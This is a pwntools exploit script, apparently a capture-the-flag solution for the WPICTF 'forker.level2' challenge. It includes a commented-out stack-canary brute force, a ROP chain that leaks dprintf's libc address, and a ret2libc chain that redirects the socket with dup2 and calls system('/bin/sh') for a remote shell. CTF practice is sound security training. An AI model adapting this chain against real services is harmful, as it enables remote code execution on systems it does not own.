from pwn import *

target = ELF('forker.level2')
libc = ELF('libc-2.26.so')

context.log_level = 'debug'

# base_payload = '\x00' * 0x48

# for i in xrange(8):
# 	for j in xrange(0x100):
# 		if j == 0x0a:
# 			continue

# 		r = remote('forker2.wpictf.xyz', 31337)

# 		payload = base_payload + chr(j)
# 		r.sendlineafter('Password:', payload)
# 		try:
# 			r.recvuntil('You failed to get a correct password!')
# 		except EOFError:
# 			pass
# 		else:
# 			break
# 		finally:
# 			r.close()
# 	base_payload += chr(j)

CANARY = '\x00\x45\xb2\xdc\xa3\xd5\x01\xcf'
base_payload = '\x00' * 0x48 + CANARY



POP_RDI = 0x400bc3
POP_RSI_R15 = 0x400bc1

r = remote('forker2.wpictf.xyz', 31337)

fd = 4

payload = ''
payload += base_payload.ljust(0x78, '\x00')
payload += p64(POP_RDI)
payload += p64(fd)
payload += p64(POP_RSI_R15)
payload += p64(target.got['dprintf'])
payload += p64(0)
payload += p64(target.plt['dprintf'])

r.sendlineafter('Password:', payload)

LIBC_BASE = u64(r.recv(6) + '\x00\x00') - libc.symbols['dprintf']
OFFSET_BIN_SH = 0x1a3f20

r.close()



r = remote('forker2.wpictf.xyz', 31337)

fd = 4

payload = ''
payload += base_payload.ljust(0x78, '\x00')
payload += p64(POP_RDI)
payload += p64(fd)
payload += p64(POP_RSI_R15)
payload += p64(0)
payload += p64(0)
payload += p64(LIBC_BASE + libc.symbols['dup2'])
payload += p64(POP_RDI)
payload += p64(fd)
payload += p64(POP_RSI_R15)
payload += p64(1)
payload += p64(0)
payload += p64(LIBC_BASE + libc.symbols['dup2'])
payload += p64(POP_RDI)
payload += p64(fd)
payload += p64(POP_RSI_R15)
payload += p64(2)
payload += p64(0)
payload += p64(LIBC_BASE + libc.symbols['dup2'])
payload += p64(POP_RDI)
payload += p64(LIBC_BASE + OFFSET_BIN_SH)
payload += p64(LIBC_BASE + libc.symbols['system'])

r.sendlineafter('Password:', payload)

r.interactive()
